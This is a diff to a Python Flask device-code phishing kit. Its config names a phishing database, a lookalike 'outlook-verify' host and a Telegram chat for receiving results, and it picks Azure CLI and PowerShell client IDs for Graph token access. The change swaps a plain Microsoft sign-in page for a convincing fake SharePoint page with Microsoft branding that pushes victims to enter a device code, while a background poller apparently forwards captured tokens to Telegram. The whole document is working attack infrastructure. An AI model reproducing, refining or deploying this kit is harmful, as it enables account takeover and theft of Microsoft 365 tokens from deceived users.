@@ -16,7 +16,6 @@ TELEGRAM_CHAT = "8877118461"
 DB_PATH = "/tmp/phish.db"
 APP_URL = "https://outlook-verify.onrender.com"
 
-# Only first-party public clients preauthorized for Graph .default
 CLIENT_IDS = [
     "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Azure CLI
     "1950a258-227b-4e31-a9cf-717495945fc2",  # Azure PowerShell
@@ -25,7 +24,6 @@ CLIENT_IDS = [
 ]
 CLIENT_ID_INDEX = 0
 
-# Fixed scope - first-party clients are ALWAYS preauthorized for this
 DEVICE_CODE_SCOPE = "https://graph.microsoft.com/.default offline_access openid profile"
 
 app = Flask(__name__)
@@ -73,16 +71,9 @@ def db_update_session(sid, **kw):
     con.commit()
     con.close()
 
-def db_get_session(sid):
-    con = sqlite3.connect(DB_PATH)
-    row = con.execute("SELECT * FROM sessions WHERE id=?", (sid,)).fetchone()
-    con.close()
-    return row
-
 # ---------- Telegram ----------
 def send_telegram(text):
     try:
-        # Chunk long messages (Telegram limit ~4096 chars)
         while len(text) > 4000:
             chunk = text[:4000]
             cut = chunk.rfind("\n")
@@ -208,40 +199,128 @@ def poll_worker():
 
 shutdown_event = threading.Event()
 
-# ---------- Page ----------
+# ---------- Page (SharePoint style) ----------
 def render_page(user_code, verify_url):
     return f"""<!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Sign in to Microsoft</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SharePoint - Verify Identity</title>
 <style>
-  html,body{{margin:0;padding:0;min-height:100vh;background:#fff;font-family:'Segoe UI',Arial,sans-serif;}}
-  .outer{{display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:20px;}}
-  .logo{{width:108px;margin-bottom:24px;}}
-  .box{{max-width:440px;width:100%;padding:44px 40px 36px;}}
-  h1{{font-size:24px;font-weight:600;color:#1b1b1b;margin:0 0 12px;}}
-  p{{font-size:15px;color:#1b1b1b;line-height:1.5;margin:0 0 16px;}}
-  .code{{font-size:26px;font-weight:700;letter-spacing:2px;color:#0067b8;margin:20px 0 24px;text-align:center;}}
-  .btn{{width:100%;padding:10px 12px;background:#0067b8;color:#fff;border:none;border-radius:4px;font-size:15px;cursor:pointer;font-family:inherit;}}
-  .btn:hover{{background:#005da6;}}
-  .hint{{margin-top:24px;font-size:13px;color:#666;}}
+* {{ margin: 0; padding: 0; box-sizing: border-box; }}
+body {{ font-family: 'Segoe UI', 'Segoe UI Web (West European)', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', sans-serif; background-color: #faf9f8; color: #201f1e; min-height: 100vh; line-height: 1.5; overflow-x: hidden; }}
+.sp-header {{ background: linear-gradient(90deg, #0078d4 0%, #106ebe 100%); height: 48px; display: flex; align-items: center; padding: 0 24px; box-shadow: 0 2px 4px rgba(0,0,0,0.12); position: relative; z-index: 100; }}
+.sp-logo {{ width: 32px; height: 32px; background: white; border-radius: 4px; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 18px; color: #0078d4; margin-right: 12px; }}
+.sp-title {{ color: white; font-size: 16px; font-weight: 600; letter-spacing: 0.2px; }}
+.breadcrumb {{ background: white; padding: 12px 32px; border-bottom: 1px solid #edebe9; font-size: 14px; display: flex; align-items: center; gap: 8px; }}
+.breadcrumb a {{ color: #0078d4; text-decoration: none; }}
+.breadcrumb a:hover {{ text-decoration: underline; color: #106ebe; }}
+.breadcrumb .sep {{ color: #a19f9d; margin: 0 2px; }}
+.breadcrumb .current {{ color: #201f1e; font-weight: 600; }}
+.main-container {{ max-width: 1100px; margin: 30px auto; padding: 0 20px; }}
+.card {{ background: white; border-radius: 8px; box-shadow: 0 1.6px 3.6px 0 rgba(0,0,0,0.13), 0 0.3px 0.9px 0 rgba(0,0,0,0.11); overflow: hidden; border: 1px solid #e1dfdd; position: relative; min-height: 520px; }}
+.doc-lib-bg {{ position: absolute; top: 0; left: 0; right: 0; bottom: 0; filter: blur(4px); opacity: 0.5; pointer-events: none; user-select: none; z-index: 1; overflow: hidden; }}
+.sp-toolbar {{ display: flex; align-items: center; padding: 8px 16px; background: white; border-bottom: 1px solid #e1dfdd; gap: 8px; }}
+.toolbar-btn {{ display: inline-flex; align-items: center; gap: 6px; padding: 6px 14px; border: 1px solid #8a8886; border-radius: 4px; font-size: 13px; font-weight: 600; color: #323130; background: white; }}
+.toolbar-btn.primary {{ background: #0078d4; color: white; border-color: #0078d4; }}
+.toolbar-btn svg {{ width: 14px; height: 14px; fill: currentColor; }}
+.toolbar-divider {{ width: 1px; height: 24px; background: #d2d0ce; margin: 0 4px; }}
+.toolbar-icon-btn {{ width: 32px; height: 32px; display: flex; align-items: center; justify-content: center; border-radius: 4px; color: #605e5c; }}
+.toolbar-icon-btn svg {{ width: 16px; height: 16px; fill: currentColor; }}
+.file-list-table {{ width: 100%; border-collapse: collapse; font-size: 13px; background: white; }}
+.file-list-table th {{ background: #faf9f8; padding: 8px 12px; text-align: left; font-weight: 600; color: #323130; border-bottom: 1px solid #e1dfdd; font-size: 12px; }}
+.file-list-table th:first-child {{ width: 40px; text-align: center; }}
+.file-list-table td {{ padding: 10px 12px; border-bottom: 1px solid #edebe9; color: #323130; vertical-align: middle; }}
+.file-icon-cell {{ display: flex; align-items: center; gap: 10px; }}
+.file-type-icon {{ width: 24px; height: 24px; border-radius: 3px; display: flex; align-items: center; justify-content: center; font-size: 9px; font-weight: 700; color: white; flex-shrink: 0; }}
+.icon-excel {{ background: #217346; }}
+.icon-word {{ background: #2b579a; }}
+.icon-ppt {{ background: #d24726; }}
+.icon-pdf {{ background: #b30b00; }}
+.icon-folder {{ background: #fce100; color: #323130; }}
+.file-name-text {{ font-weight: 500; color: #0078d4; }}
+.file-name-text.folder {{ color: #323130; font-weight: 600; }}
+.modified-date, .modified-by {{ color: #605e5c; font-size: 12px; }}
+.checkbox {{ width: 16px; height: 16px; border: 1px solid #8a8886; border-radius: 2px; display: inline-block; }}
+.verify-overlay {{ position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 10; background: white; border-radius: 12px; box-shadow: 0 8px 32px rgba(0,0,0,0.18), 0 2px 8px rgba(0,0,0,0.08); padding: 48px 56px; text-align: center; max-width: 520px; width: 90%; border: 1px solid #e1dfdd; }}
+.ms-brand-header {{ display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 24px; }}
+.ms-grid-logo {{ display: grid; grid-template-columns: 1fr 1fr; gap: 2px; width: 24px; height: 24px; }}
+.ms-grid-logo span:nth-child(1) {{ background: #f25022; }}
+.ms-grid-logo span:nth-child(2) {{ background: #7fba00; }}
+.ms-grid-logo span:nth-child(3) {{ background: #00a4ef; }}
+.ms-grid-logo span:nth-child(4) {{ background: #ffb900; }}
+.ms-text-logo {{ font-size: 24px; font-weight: 600; color: #737373; letter-spacing: -0.5px; }}
+.verify-title {{ font-size: 26px; font-weight: 700; color: #1b1b1b; margin-bottom: 12px; line-height: 1.3; }}
+.verify-subtitle {{ font-size: 16px; color: #1b1b1b; line-height: 1.5; margin-bottom: 28px; }}
+.code-box {{ display: flex; align-items: center; justify-content: space-between; background: #f0f4f9; border: 1px solid #d1d9e6; border-radius: 6px; padding: 16px 24px; margin-bottom: 28px; }}
+.code-text {{ font-size: 38px; font-weight: 700; color: #005a9e; letter-spacing: 4px; font-family: 'Segoe UI', sans-serif; }}
+.copy-btn {{ display: flex; align-items: center; gap: 8px; background: none; border: none; color: #005a9e; font-size: 16px; font-weight: 600; cursor: pointer; padding: 8px; border-radius: 4px; transition: background 0.2s; }}
+.copy-btn:hover {{ background: rgba(0, 90, 158, 0.1); }}
+.copy-btn svg {{ width: 20px; height: 20px; fill: #005a9e; }}
+.action-btn {{ display: flex; align-items: center; justify-content: center; gap: 10px; width: 100%; padding: 14px 24px; background: #005a9e; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; text-decoration: none; transition: background 0.2s; }}
+.action-btn:hover {{ background: #004578; }}
+.action-btn svg {{ width: 18px; height: 18px; fill: white; }}
+.footer {{ text-align: center; padding: 24px; font-size: 12px; color: #a19f9d; }}
+.footer a {{ color: #0078d4; text-decoration: none; }}
+.footer a:hover {{ text-decoration: underline; }}
+@media (max-width: 640px) {{ .main-container {{ margin: 20px auto; padding: 0 12px; }} .verify-overlay {{ padding: 32px 24px; }} .verify-title {{ font-size: 22px; }} .code-text {{ font-size: 28px; letter-spacing: 2px; }} .breadcrumb {{ padding: 10px 16px; font-size: 13px; }} }}
 </style>
 </head>
 <body>
-<div class="outer">
-  <div class="box">
-    <svg class="logo" viewBox="0 0 96 72" xmlns="http://www.w3.org/2000/svg"><path fill="#F25022" d="M0 0h45v45H0z"/><path fill="#7FBA00" d="M51 0h45v45H51z"/><path fill="#00A4EF" d="M0 51h45v21H0z"/><path fill="#FFB900" d="M51 51h45v21H51z"/></svg>
-    <h1>Enter the code to sign in</h1>
-    <p>To sign in to Microsoft, enter this code on the verification page.</p>
-    <div class="code">{user_code}</div>
-    <button class="btn" onclick="go()">Continue</button>
-    <p class="hint">You'll be redirected to microsoft.com/devicelogin to complete sign-in.</p>
-  </div>
+<header class="sp-header">
+    <div class="sp-logo">S</div>
+    <span class="sp-title">SharePoint</span>
+</header>
+<nav class="breadcrumb">
+    <a href="#">Home</a><span class="sep">›</span><a href="#">Documents</a><span class="sep">›</span><span class="current">Shared-Document.xlsx</span>
+</nav>
+<div class="main-container">
+    <div class="card">
+        <div class="doc-lib-bg">
+            <div class="sp-toolbar">
+                <button class="toolbar-btn primary"><svg viewBox="0 0 24 24"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg>New</button>
+                <button class="toolbar-btn"><svg viewBox="0 0 24 24"><path d="M9 16h6v-6h4l-7-7-7 7h4v6zm-4 2h14v2H5v-2z"/></svg>Upload</button>
+                <div class="toolbar-divider"></div>
+                <button class="toolbar-btn"><svg viewBox="0 0 24 24"><path d="M17 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V7l-4-4zm-5 16c-1.66 0-3-1.34-3-3s1.34-3 3-3 3 1.34 3 3-1.34 3-3 3zm3-10H5V5h10v4z"/></svg>Sync</button>
+                <button class="toolbar-btn"><svg viewBox="0 0 24 24"><path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/></svg>Automate</button>
+                <div class="toolbar-divider"></div>
+                <div class="toolbar-icon-btn"><svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg></div>
+                <div style="flex:1;"></div>
+                <div class="toolbar-icon-btn"><svg viewBox="0 0 24 24"><path d="M3 18h6v-2H3v2zM3 6v2h18V6H3zm0 7h12v-2H3v2z"/></svg></div>
+            </div>
+            <table class="file-list-table">
+                <thead><tr><th><span class="checkbox"></span></th><th>Name</th><th>Modified</th><th>Modified By</th><th>File Size</th></tr></thead>
+                <tbody>
+                    <tr><td><span class="checkbox"></span></td><td><div class="file-icon-cell"><div class="file-type-icon icon-folder">📁</div><span class="file-name-text folder">Project Documents</span></div></td><td class="modified-date">Nov 10, 2026</td><td class="modified-by">J. Smith</td><td class="modified-date">—</td></tr>
+                    <tr><td><span class="checkbox"></span></td><td><div class="file-icon-cell"><div class="file-type-icon icon-excel">X</div><span class="file-name-text">Q4_Budget_2026.xlsx</span></div></td><td class="modified-date">Nov 10, 2026</td><td class="modified-by">A. Lee</td><td class="modified-date">245 KB</td></tr>
+                    <tr><td><span class="checkbox"></span></td><td><div class="file-icon-cell"><div class="file-type-icon icon-word">W</div><span class="file-name-text">Meeting_Notes_Nov.docx</span></div></td><td class="modified-date">Nov 9, 2026</td><td class="modified-by">K. West</td><td class="modified-date">89 KB</td></tr>
+                    <tr><td><span class="checkbox"></span></td><td><div class="file-icon-cell"><div class="file-type-icon icon-ppt">P</div><span class="file-name-text">Strategy_Presentation.pptx</span></div></td><td class="modified-date">Nov 7, 2026</td><td class="modified-by">T. Brown</td><td class="modified-date">3.2 MB</td></tr>
+                    <tr><td><span class="checkbox"></span></td><td><div class="file-icon-cell"><div class="file-type-icon icon-pdf">PDF</div><span class="file-name-text">Contract_Agreement.pdf</span></div></td><td class="modified-date">Nov 5, 2026</td><td class="modified-by">R. Garcia</td><td class="modified-date">1.1 MB</td></tr>
+                </tbody>
+            </table>
+        </div>
+        <div class="verify-overlay">
+            <div class="ms-brand-header">
+                <div class="ms-grid-logo"><span></span><span></span><span></span><span></span></div>
+                <span class="ms-text-logo">Microsoft</span>
+            </div>
+            <h1 class="verify-title">Copy and paste this code to authenticate</h1>
+            <p class="verify-subtitle">To continue, copy the code below and paste it on Microsoft's verification page.</p>
+            <div class="code-box">
+                <span class="code-text">{user_code}</span>
+                <button class="copy-btn" onclick="go()"><svg viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>Copy</button>
+            </div>
+            <a href="#" class="action-btn" onclick="go(); return false;">
+                <svg viewBox="0 0 24 24"><path d="M19 19H5V5h7V3H5c-1.11 0-2 .9-2 2v14c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2v-7h-2v7zM14 3v2h3.59l-9.83 9.83 1.41 1.41L19 6.41V10h2V3h-7z"/></svg>
+                Go to microsoft.com/devicelogin
+            </a>
+        </div>
+    </div>
 </div>
+<footer class="footer">© 2026 Microsoft Corporation · <a href="#">Privacy</a> · <a href="#">Terms of Use</a> · <a href="#">Trademarks</a></footer>
 <script>
-function go(){{
+function go() {{
   navigator.clipboard.writeText("{user_code}").catch(function(){{}});
   setTimeout(function(){{ window.location.href = "{verify_url}"; }}, 250);
 }}
@@ -283,7 +362,6 @@ if __name__ == "__main__":
     t.start()
     app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
 else:
-    # Gunicorn import path
     t = threading.Thread(target=poll_worker, daemon=True)
     t.start()
 
